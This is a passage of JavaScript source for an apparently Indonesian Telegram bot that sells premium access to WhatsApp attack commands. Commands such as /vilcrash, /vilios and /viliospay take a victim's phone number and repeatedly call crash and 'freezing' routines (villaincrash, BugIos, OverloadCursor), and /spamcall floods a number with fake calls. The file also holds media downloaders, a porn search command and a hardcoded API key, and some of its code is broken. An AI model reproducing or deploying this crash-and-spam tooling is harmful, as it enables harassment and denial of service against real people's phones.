│ • Upgrade ke premium untuk
│   menggunakan fitur ini
│
╰═════════════════════⊱
        `);
    }
  if (!q) {
    return ctx.reply(`
┏━━━❰ 𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Masukkan nomor target!
┣⟣ Contoh: /vilcrash 62xxx
┗━━━━━━━━━━━━━━━
    `);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);


  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
      await sal_blank(target);
      await villaincrash(target);
      }

  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("vilandro", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply(`
╭═══════『 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Status: Not Premium ❌
│ • Upgrade ke premium untuk
│   menggunakan fitur ini
│
╰═════════════════════⊱
        `);
    }
  if (!q) {
    return ctx.reply(`
┏━━━❰ 𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Masukkan nomor target!
┣⟣ Contoh: /vilandro 62xxx
┗━━━━━━━━━━━━━━━
    `);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);


  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
      await sal_blank(target);
      await villaincrash(target);
      }
  
  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("vilui", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply(`
╭═══════『 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Status: Not Premium ❌
│ • Upgrade ke premium untuk
│   menggunakan fitur ini
│
╰═════════════════════⊱
        `);
    }
  if (!q) {
    return ctx.reply(`
┏━━━❰ 𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Masukkan nomor target!
┣⟣ Contoh: /vilui 62xxx
┗━━━━━━━━━━━━━━━
    `);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);


    // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
      await sal_blank(target);
      await villaincrash(target);
      }
  
  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
bot.command("vilblank", cooldownMiddleware, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply(`
╭═══════『 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Status: Not Premium ❌
│ • Upgrade ke premium untuk
│   menggunakan fitur ini
│
╰═════════════════════⊱
        `);
    }
  if (!q) {
    return ctx.reply(`
┏━━━❰ 𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Masukkan nomor target!
┣⟣ Contoh: /vilblank 62xxx
┗━━━━━━━━━━━━━━━`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);


  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 1; i++) {
      await sal_blank(target);
      await villaincrash(target);
      }
  // Menyelesaikan proses response
  await donerespone(target, ctx);
});
const spamCall = async (ctx, target, count = 1) => {
  if (!target) {
    ctx.reply("❌ Error: Target tidak ditentukan.");
    return;
  }

  try {
    for (let i = 0; i < count; i++) {
      ctx.reply(`📞 Mengirim spam call ${i + 1} ke: ${target}`);
      
      const callLogMessage = {
        message: {
          callLogMessage: {
            callType: "AUDIO", // Ubah ke "VIDEO" untuk panggilan video
            callResult: "CANCELLED", // Nilai lain: "MISSED"
            callDuration: "0",
            participant: target,
            isVideo: false,
          },
        },
      };

      // Simulasi pengiriman pesan (relayMessage diganti sesuai kebutuhan)
      console.log(`Relay message:`, callLogMessage);

      // Delay 1 detik
      await new Promise((resolve) => setTimeout(resolve, 1000));
    }

    ctx.reply(`✅ Berhasil mengirimkan ${count} panggilan spam ke ${target}`);
  } catch (error) {
    ctx.reply(`❌ Gagal melakukan spam call. Error: ${error.message}`);
  }
};
bot.command("spamcall", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1); // Ambil argumen dari teks pesan
  const target = args[0]; // Target panggilan
  const count = parseInt(args[1]) || 1; // Jumlah panggilan (default 1)
 const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!target) {
    ctx.reply("❌ Mohon sertakan target. Contoh: `/spamcall 628123456789 5`");
    return;
  }

  await spamCall(ctx, target, count);
});
async function tiktokSearchVideo(query) {
  try {
    const response = await axios.post("https://tikwm.com/api/feed/search", 
      new URLSearchParams({
        keywords: query,
        count: 12,
        cursor: 0,
        web: 1,
        hd: 1,
      }), {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Accept': 'application/json, text/javascript, */*; q=0.01',
          'X-Requested-With': 'XMLHttpRequest',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
          'Referer': 'https://www.tikwm.com/'
        },
      }
    );
    return response.data.data; // Mengembalikan data video yang ditemukan
  } catch (error) {
    console.error('Error fetching TikTok data:', error);
    throw new Error('Gagal mendapatkan data TikTok');
  }
}
bot.command("vilios", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply(`
┏━━━❰ 𝘽𝙪𝙮 𝘼𝙠𝙨𝙚𝙨 𝘿𝙪𝙡𝙪 ❱━━━
┣⟣ Anda Belum Akses Prem
┗━━━━━━━━━━━━━
        `);
    }
  if (!q) {
    return ctx.reply(`
┏━━━❰ 𝙎𝘼𝙇𝘼𝙃 𝙂𝙊𝘽𝙇𝙊𝙆 ❱━━━
┣⟣ Masukkan nomor target!
┣⟣ Contoh: /vilios 62xxx
┗━━━━━━━━━━━━━━━
    `);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
for (let i = 0; i < 30; i++) {
      await FreezeTruns(target, { ptcp: true });
      await InvisibleLoadFast(target);
      }
   for (let i = 0; i < 10; i++) {   
      await BugIos(target, { ptcp: true });
      await OverloadCursor(target, { ptcp: true });
      await f5(target, { ptcp: true });
      await Jade(target);
  }
  
  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('Proses selesai.');
});
bot.command("viliospay", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 5; i++) {
           await TxIos(target);
           await Jade(target);
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('Proses selesai.');
});
bot.command("viliosinvis",cooldownMiddleware , checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1]; // Mengambil argumen pertama setelah perintah
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
  if (!q) {
    return ctx.reply(`Example: commandnya 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  // Proses response pertama
  await prosesrespone(target, ctx);

  // Melakukan proses freezing 50 kali
  for (let i = 0; i < 5; i++) {
           await IosMJ(target, { ptcp: true });
           await TxIos(target);
  }

  // Menyelesaikan proses response
  await donerespone(target, ctx);

  return ctx.reply('Proses selesai.');
});

bot.command('gemini', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' '); // Ambil teks setelah `/gemini`

    if (!text) {
        return ctx.reply("Hai, apa yang ingin saya bantu? Ketik `/gemini <pertanyaan>`.");
    }

    try {
        const response = await axios.get(
            `https://restapi.apibotwa.biz.id/api/gemini?message=${encodeURIComponent(text)}`
        );
        const data = response.data;

        if (data.status === 200 && data.data.response) {
            const caption = `⬣───「 G E M I N I 」───⬣\n\nTitle : ${text}\n\nAnswer : ${data.data.response}`;
            const imageUrl = "https://files.catbox.moe/qzm0ye.jpg"; // Ganti dengan URL gambar yang relevan

            await ctx.replyWithPhoto(imageUrl, { caption });
        } else {
            ctx.reply("API mengembalikan status gagal atau respons tidak tersedia.");
        }
    } catch (error) {
        console.error("Error:", error.message);
        ctx.reply("Maaf, terjadi kesalahan saat memproses permintaan.");
    }
});
//Menu Awal
bot.command("status", ctx => {
  if (isWhatsAppConnected) {
    ctx.reply(`✅ WhatsApp terhubung dengan nomor: ${linkedWhatsAppNumber || "Tidak diketahui"}`);
  } else {
    ctx.reply("❌ WhatsApp belum terhubung.");
  }
});
// Fungsi untuk memanggil API
async function openaiChat(text) {
    try {
        const response = await axios.get(
            `https://exonity.tech/api/gptlogic2?message=${encodeURIComponent(text)}&prompt=hai&mode=realtime`
        );
        const data = response.data;

        if (data.status === 200) {
            return data.result || "Tidak ada respons dari API.";
        } else {
            return "API mengembalikan status gagal.";
        }
    } catch (error) {
        console.error("Error:", error.message);
        return "Maaf, terjadi kesalahan saat memproses permintaan.";
    }
}

// Handler untuk command `/gpt4`


bot.command('gpt4', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' '); // Ambil teks setelah `/gpt4`

    if (!text) {
        return ctx.reply("Hai, apa yang ingin saya bantu? Ketik `/gpt4 <pertanyaan>`.");
    }

    try {
        const response = await openaiChat(text);
        ctx.reply(response);
    } catch (error) {
        ctx.reply("Maaf, terjadi kesalahan saat memproses permintaan.");
    }
});
async function simiChat(text) {
    try {
        const response = await axios.get(
            `https://api.betabotz.eu.org/api/search/simisimi?query=${encodeURIComponent(text)}&apikey=caywzzaja2`
        );
        const data = response.data;

        if (data.status && data.code === 200) {
            return data.result || "Tidak ada respons dari API.";
        } else {
            return "API mengembalikan status gagal.";
        }
    } catch (error) {
        console.error("Error:", error.message);
        return "Maaf, terjadi kesalahan saat memproses permintaan.";
    }
}

// Handler untuk command `/simi`
bot.command('simi', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' '); // Ambil teks setelah `/simi`

    if (!text) {
        return ctx.reply("Hai, apa yang ingin saya bantu? Ketik `/simi <pesan>`.");
    }

    try {
        const response = await simiChat(text);
        ctx.reply(response);
    } catch (error) {
        ctx.reply("Maaf, terjadi kesalahan saat memproses permintaan.");
    }
});
const yts = require("yt-search");
const path = require("path");

bot.command("play", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); // Mengambil teks setelah /play
  if (!text) {
    return ctx.reply("Contoh:\n> /play Pulang - Waliband");
  }

  await ctx.reply("Tunggu sebentar, sedang mencari dan mengunduh lagu...");

  try {
    // **Langkah 1: Pencarian video di YouTube**
    const search = await yts(text);
    const firstVideo = search.all[0];
    if (!firstVideo) {
      return ctx.reply("Lagu tidak ditemukan. Coba dengan kata kunci lain.");
    }

    // **Langkah 2: Mendapatkan URL download dari API**
    const apiUrl = `https://api.agatz.xyz/api/ytmp3?url=${encodeURIComponent(
      firstVideo.url
    )}`;
    const { data: zora } = await axios.get(apiUrl);

    if (!zora.data || zora.data.length === 0 || !zora.data[0].downloadUrl) {
      return ctx.reply("Gagal mendapatkan file audio.");
    }

    const final = zora.data[0];
    const audioPath = path.resolve(__dirname, `${firstVideo.title}.mp3`);

    // **Langkah 3: Unduh file audio**
    const downloadResponse = await axios({
      url: final.downloadUrl,
      method: "GET",
      responseType: "stream",
    });

    const fileStream = fs.createWriteStream(audioPath);
    await new Promise((resolve, reject) => {
      downloadResponse.data.pipe(fileStream);
      downloadResponse.data.on("error", reject);
      fileStream.on("finish", resolve);
    });

    // **Langkah 4: Kirim file audio ke pengguna**
    await ctx.replyWithAudio(
      { source: audioPath },
      {
        caption: `🎵 *${firstVideo.title || "Untitled"}*\n\n🔗 [Tonton di YouTube](${firstVideo.url})`,
        parse_mode: "Markdown",
      }
    );

    // **Langkah 5: Hapus file setelah dikirim**
    fs.unlinkSync(audioPath);
  } catch (e) {
    console.error(e);

    if (e.response) {
      // Error dari server API
      return ctx.reply(
        `Error dari server: ${e.response.status} - ${e.response.statusText}`
      );
    }

    // Error umum lainnya
    return ctx.reply("Terjadi kesalahan. Coba lagi nanti.");
  }
});
bot.command('ytmp3', async (ctx) => {
    const text = ctx.message.text;
    const args = text.split(' ');

    if (args.length < 2) {
        return ctx.reply("𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗦𝗮𝗹𝗮𝗵!\n [ Cobalah /ytmp3 < url > ]");
    }

    const url = args[1];
    const apiUrl = `https://api.betabotz.eu.org/api/download/ytmp3?url=${url}&apikey=caywzzaja2`;

    await ctx.reply("𝐏𝐫𝐨𝐬𝐞𝐬 𝐊𝐚𝐤!"); // Memberikan respon reaksi/emoji
    try {
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (data.status) {
            const audioMessage = {
                audio: { url: data.result.mp3 },
                caption: data.result.title,
                parse_mode: 'Markdown',
                reply_to_message_id: ctx.message.message_id, // Menjawab pesan sebelumnya
                reply_markup: {
                    inline_keyboard: [[
                        { text: 'Download MP3', url: data.result.mp3 }
                    ]]
                }
            };

            await ctx.replyWithAudio(audioMessage.audio.url, audioMessage);
        } else {
            ctx.reply("Tidak dapat memproses link ini, coba lagi nanti.");
        }
    } catch (error) {
        ctx.reply("Terjadi kesalahan, coba lagi nanti!");
        console.error(error);
    }

    await ctx.reply("𝗯𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗸𝗮𝗸!"); // Memberikan respon reaksi/emoji setelah proses selesai
});
bot.command('ytmp4', async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(' ');

  if (args.length < 2) {
    return ctx.reply("𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗦𝗮𝗹𝗮𝗵!\n [ Cobalah /ytmp4 < url > ]");
  }

  const videoUrl = args[1];
  const apiUrl = `https://api.betabotz.eu.org/api/download/ytmp4?url=${videoUrl}&apikey=caywzzaja2`;

  // Reply dengan pesan 'Proses' saat mulai
  await ctx.reply('Proses mengunduh video...⏱️');

  try {
    // Menggunakan axios untuk mengambil data dari API yang baru
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status) {
      // Mengambil data video dan informasi lainnya dari API response
      const videoUrl = data.result.mp4;
      const title = data.result.title;
      const thumbUrl = data.result.thumb;
      
      // Kirim video dengan format MP4
      await ctx.replyWithVideo(videoUrl, {
        caption: `${title}\n\nDurasi: ${data.result.duration} detik`,
        thumb: thumbUrl, // Menggunakan thumbnail dari video
        filename: `${title}.mp4`
      });

      // Reply dengan pesan 'Selesai' setelah selesai mengirim video
      await ctx.reply('Selesai! ✅');
    } else {
      ctx.reply("Tidak dapat menemukan video. Periksa URL yang kamu kirim.");
    }
  } catch (error) {
    ctx.reply("Terjadi kesalahan, coba lagi nanti!");
    console.error(error);
  }
});
bot.command("tiktokmp3", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ");

  if (args.length < 2) {
    return ctx.reply("𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗦𝗮𝗹𝗮𝗵!\n [ Cobalah /tiktokmp3 < url > ]");
  }

  const videoUrl = args[1];
  const apiUrl = `https://api.betabotz.eu.org/api/download/tiktok?url=${videoUrl}&apikey=caywzzaja2`;

  // Reply dengan pesan 'Proses' saat mulai
  await ctx.reply("Proses mengunduh audio...⏱️");

  try {
    // Menggunakan axios untuk mengambil data dari API
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status) {
      // Mengambil data audio dan informasi lainnya dari API response
      const audioUrl = data.result.audio[0];
      const title = data.result.title;

      // Kirim audio dengan format MP3
      await ctx.replyWithAudio(audioUrl, {
        caption: `${title}`,
        title: `${title}.mp3`,
      });

      // Reply dengan pesan 'Selesai' setelah selesai mengirim audio
      await ctx.reply("Selesai! ✅");
    } else {
      ctx.reply("Tidak dapat menemukan audio. Periksa URL yang kamu kirim.");
    }
  } catch (error) {
    ctx.reply("Terjadi kesalahan, coba lagi nanti!");
    console.error(error);
  }
});
// Daftar untuk menyimpan sesi perangkat
bot.command("tiktokmp3", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ");

  if (args.length < 2) {
    return ctx.reply("𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗦𝗮𝗹𝗮𝗵!\n [ Cobalah /tiktokmp3 < url > ]");
  }

  const videoUrl = args[1];
  const apiUrl = `https://api.betabotz.eu.org/api/download/tiktok?url=${videoUrl}&apikey=caywzzaja2`;

  // Reply dengan pesan 'Proses' saat mulai
  await ctx.reply("Proses mengunduh audio...⏱️");

  try {
    // Menggunakan axios untuk mengambil data dari API
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status) {
      // Mengambil data audio dan informasi lainnya dari API response
      const audioUrl = data.result.audio[0];
      const title = data.result.title;

      // Kirim audio dengan format MP3
      await ctx.replyWithAudio(audioUrl, {
        caption: `${title}`,
        title: `${title}.mp3`,
      });

      // Reply dengan pesan 'Selesai' setelah selesai mengirim audio
      await ctx.reply("Selesai! ✅");
    } else {
      ctx.reply("Tidak dapat menemukan audio. Periksa URL yang kamu kirim.");
    }
  } catch (error) {
    ctx.reply("Terjadi kesalahan, coba lagi nanti!");
    console.error(error);
  }
});
bot.command("spotifymp3", async (ctx) => {
  const text = ctx.message.text;
  const args = text.split(" ");

  if (args.length < 2) {
    return ctx.reply("𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗦𝗮𝗹𝗮𝗵!\n [ Cobalah /spotifymp3 < url > ]");
  }

  const videoUrl = args[1];
  const apiUrl = `https://api.betabotz.eu.org/api/download/spotify?url=${videoUrl}&apikey=caywzzaja2`;

  // Reply dengan pesan 'Proses' saat mulai
  await ctx.reply("Proses mengunduh audio...⏱️");

  try {
    // Menggunakan axios untuk mengambil data dari API
    const response = await axios.get(apiUrl);
    const data = response.data;

    if (data.status && data.result && data.result.data) {
      const result = data.result.data;

      // Mengambil informasi dari respons API
      const audioUrl = result.url;
      const title = result.title;
      const artist = result.artist.name;
      const thumbnail = result.thumbnail;
      const duration = result.duration;

      // Kirim audio dengan format MP3
      await ctx.replyWithAudio(
        { url: audioUrl }, // URL audio
        {
          caption: `🎵 𝐉𝐮𝐝𝐮𝐥: ${title}\n🎤 𝐀𝐫𝐭𝐢𝐬𝐭: ${artist}\n⏱ 𝐃𝐮𝐫𝐚𝐬𝐢: ${duration}\n# T.me/reynzjirr`,
          thumb: { url: thumbnail }, // Thumbnail dari lagu
          performer: artist,
          title: title,
        }
      );

      // Reply dengan pesan 'Selesai' setelah selesai mengirim audio
      await ctx.reply("Selesai! ✅");
    } else {
      ctx.reply("Tidak dapat menemukan audio. Periksa URL yang kamu kirim.");
    }
  } catch (error) {
    ctx.reply("Terjadi kesalahan, coba lagi nanti!");
    console.error(error);
  }
});
// Fungsi untuk escape karakter Markdown
function escapeMarkdown(text) {
  if (typeof text !== "string") return text;
  return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
}
// Komando TikTok search
bot.command("tiktoksearch", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply("Harap masukkan kata kunci pencarian. Contoh: /tiktoksearch perfect world");
  }

  try {
   					let search = await tiktokSearchVideo(text);

    if (response.data.status && response.data.result.data.length > 0) {
      const results = response.data.result.data;
      let currentIndex = 0;

      const sendVideo = async (index) => {
        const video = results[index];
        if (!video) {
          return ctx.reply("Video tidak ditemukan.");
        }

        const caption = `
🎥 *${escapeMarkdown(video.title)}*
⏱️ Durasi: ${escapeMarkdown(video.duration.toString())} detik
👀 Dilihat: ${escapeMarkdown(video.play_count.toString())}
❤️ Likes: ${escapeMarkdown(video.digg_count.toString())}
💬 Komentar: ${escapeMarkdown(video.comment_count.toString())}
🔗 [Tonton di TikTok](${escapeMarkdown(video.play)})
👤 Author: ${escapeMarkdown(video.author.nickname)} (@${escapeMarkdown(video.author.unique_id)})
        `.trim();

        await ctx.replyWithVideo(
          { url: video.play },
          {
            caption: caption,
            parse_mode: "Markdown",
            reply_markup: Markup.inlineKeyboard([
              Markup.button.callback("⬅️ Back", `back_${index}`),
              Markup.button.callback("Next ➡️", `next_${index}`)
            ])
          }
        );
      };

      await sendVideo(currentIndex);

      // Aksi tombol "Back"
      bot.action(/back_(\d+)/, async (ctx) => {
        currentIndex = Math.max(0, parseInt(ctx.match[1]) - 1);
        await sendVideo(currentIndex);
        await ctx.answerCbQuery(); // Menutup callback query
      });

      // Aksi tombol "Next"
      bot.action(/next_(\d+)/, async (ctx) => {
        currentIndex = Math.min(results.length - 1, parseInt(ctx.match[1]) + 1);
        await sendVideo(currentIndex);
        await ctx.answerCbQuery(); // Menutup callback query
      });

    } else {
      ctx.reply("Tidak ada hasil pencarian untuk kata kunci tersebut.");
    }
  } catch (error) {
    console.error("Error:", error.response ? error.response.data : error.message);
    ctx.reply("Terjadi kesalahan saat mencari video TikTok.");
  }
});
bot.command("xvideosearch", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply(
      "Harap masukkan kata kunci pencarian. Contoh: /xvideosearch nuru massage"
    );
  }

  try {
    const apiUrl = `https://api.betabotz.eu.org/api/search/xvideos?query=${encodeURIComponent(
      query
    )}&apikey=caywzzaja2`;
    const response = await axios.get(apiUrl);

    if (response.data.status && response.data.result.length > 0) {
      const video = response.data.result[0]; // Ambil hanya hasil pertama
      const caption = `
🎥 *${video.title}*
⏱️ Durasi: ${video.duration}
🔗 [Tonton Video](<${video.url}>)
`.trim();

      // Cek jika thumbnail tersedia, digunakan sebagai alternatif.
      const videoUrl = video.thumb || video.url;

      await ctx.replyWithVideo(
        { url: videoUrl },
        { caption: caption, parse_mode: "Markdown" }
      );
    } else {
      ctx.reply("Tidak ada hasil ditemukan untuk pencarian tersebut.");
    }
  } catch (error) {
    console.error("Error saat mengakses API:", error);
    ctx.reply(
      "Terjadi kesalahan saat melakukan pencarian. Silakan coba lagi nanti."
    );
  }
});
// Fungsi untuk menghindari error format Markdown
function escapeMarkdown(text) {
  return text.replace(/([*_`])/g, "\\$1");
}
bot.command("spotify", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply(
      "Harap masukkan kata kunci pencarian.\nContoh: /spotify DJ Dalinda"
    );
  }

  try {
    const apiUrl = `https://api.betabotz.eu.org/api/search/spotify?query=${encodeURIComponent(query)}&apikey=caywzzaja2`;
    const response = await axios.get(apiUrl);

    if (response.data.status && response.data.result.data.length > 0) {
      const results = response.data.result.data.slice(0, 5); // Ambil 5 hasil teratas

      for (const song of results) {
        const caption = `
🎵 *${escapeMarkdown(song.title)}*
⏱️ Durasi: ${escapeMarkdown(song.duration)}
🔥 Popularitas: ${escapeMarkdown(song.popularity)}
🔗 [Dengarkan di Spotify](${song.url})
        `.trim();

        // Kirimkan thumbnail lagu (jika tersedia preview)
        if (song.preview) {
          await ctx.replyWithAudio(
            { url: song.preview },
            { caption, parse_mode: "Markdown" }
          );
        } else {
          await ctx.reply(
            `${caption}\n\n⚠️ Tidak ada pratinjau audio yang tersedia.`,
            { parse_mode: "Markdown" }
          );
        }
      }
    } else {
      ctx.reply("Tidak ada hasil ditemukan untuk pencarian tersebut.");
    }
  } catch (error) {
    console.error("Error saat mengakses API:", error);
    ctx.reply(
      "Terjadi kesalahan saat mengambil data dari Spotify. Silakan coba lagi nanti."
    );
  }
});
bot.command("youtubesearch", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ");
  if (!query) {
    return ctx.reply(
      "𝗣𝗲𝗻𝗴𝗴𝘂𝗻𝗮𝗮𝗻 𝗦𝗮𝗹𝗮𝗵!\n [ Cobalah /youtubesearch < query > ]"
    );
  }

  try {
    const apiUrl = `https://api.betabotz.eu.org/api/search/yts?query=${encodeURIComponent(query)}&apikey=caywzzaja2`;
    const response = await axios.get(apiUrl);

    if (response.data.status && response.data.result.length > 0) {
      const results = response.data.result.slice(0, 5); // Ambil 5 hasil teratas

      for (const video of results) {
        const caption = `
🎥 *${escapeMarkdown(video.title)}*
📆 Dipublikasikan: ${escapeMarkdown(video.published_at || "Tidak diketahui")}
👀 Penayangan: ${escapeMarkdown(video.views.toString())}
⏱️ Durasi: ${escapeMarkdown(video.duration)}
📜 Deskripsi: ${escapeMarkdown(video.description || "Tidak ada deskripsi.")}
🎤 Channel: [${escapeMarkdown(video.author.name)}](${video.author.url})
🔗 [Tonton di YouTube](${video.url})
        `.trim();

        // Kirimkan thumbnail video (jika tersedia)
        if (video.thumbnail) {
          await ctx.replyWithPhoto(
            { url: video.thumbnail },
            { caption, parse_mode: "Markdown" }
          );
        } else {
          await ctx.reply(
            `${caption}\n\n⚠️ Thumbnail tidak tersedia.`,
            { parse_mode: "Markdown" }
          );
        }
      }
    } else {
      ctx.reply("Tidak ada hasil ditemukan untuk pencarian tersebut.");
    }
  } catch (error) {
    console.error("Error saat mengakses API:", error);
    ctx.reply(
      "Terjadi kesalahan saat mengambil data dari YouTube. Silakan coba lagi nanti."
    );
  }
});
bot.command('googleimage', async (ctx) => {
  const fullArgs = ctx.message.text.split(' ').slice(1).join(' ');

  if (!fullArgs) {
    return ctx.reply('Contoh: /googleimage hutao genshin impact, modern');
  }

  await ctx.reply("⏱️ Tunggu sebentar...");
  try {
    // Ambil data dari API
    const response = await axios.get(
      `https://api.betabotz.eu.org/api/search/googleimage?text1=${encodeURIComponent(fullArgs)}&apikey=caywzzaja2`
    );

    const data = response.data;

    if (data.status && data.result.length > 0) {
      // Kirim gambar pertama dari hasil API
      const firstImage = data.result[0];
      await ctx.replyWithPhoto(
        { url: firstImage.url },
        { caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀:\n${fullArgs}\n\n𝗗𝗶𝗺𝗲𝗻𝘀𝗶:\n${firstImage.width}x${firstImage.height}` }
      );
    } else {
      await ctx.reply('Tidak ada gambar yang ditemukan.');
    }
  } catch (err) {
    await ctx.reply(`Terjadi kesalahan: ${err.message}`);
  }
  await ctx.reply("✅ Selesai!");
});
bot.command('pinterest', async (ctx) => {
  const fullArgs = ctx.message.text.split(' ').slice(1).join(' ');

  if (!fullArgs) {
    return ctx.reply('Contoh: /pinterest hutao genshin impact, modern');
  }

  await ctx.reply("⏱️ Tunggu sebentar...");
  try {
    // Ambil data dari API
    const response = await axios.get(
      `https://api.betabotz.eu.org/api/search/pinterest?text1=${encodeURIComponent(fullArgs)}&apikey=caywzzaja2`
    );

    const data = response.data;

    if (data.status && data.result.length > 0) {
      // Ambil hingga 5 gambar dari hasil API
      const images = data.result.slice(0, 5);

      for (const [index, imageUrl] of images.entries()) {
        await ctx.replyWithPhoto(
          { url: imageUrl },
          { caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀: ${fullArgs}\nGambar ke-${index + 1}` }
        );
      }
    } else {
      await ctx.reply('Tidak ada gambar yang ditemukan.');
    }
  } catch (err) {
    await ctx.reply(`Terjadi kesalahan: ${err.message}`);
  }
  await ctx.reply("✅ Selesai!");
});
// API Betabotz
bot.command('xcimage', async (ctx) => {
  const fullArgs = ctx.message.text.split(' ').slice(1).join(' ');

  if (!fullArgs) {
    return ctx.reply('Contoh: /xcimage hutao genshin impact, modern');
  }

  await ctx.reply("⏱️ Tunggu 30 detik...");
  try {
    await ctx.replyWithPhoto(
      { url: `https://love.neekoi.me/kivotos?text=${encodeURIComponent(fullArgs)}` },
      { caption: `𝗣𝗿𝗼𝗺𝗽𝘁𝘀:\n${fullArgs}` }
    );
  } catch (err) {
    await ctx.reply(`Error: ${err.message}`);
  }
  await ctx.reply("✅ Selesai!");
});

bot.command('xcimage2', async (ctx) => {
  const fullArgs = ctx.message.text.split(' ').slice(1).join(' ');

  if (!fullArgs) {
    return ctx.reply('Contoh: /xcimage2 hutao genshin impact, modern');
  }

  await ctx.reply("⏱️ Tunggu 30 detik...");
  try {
    await ctx.replyWithPhoto(
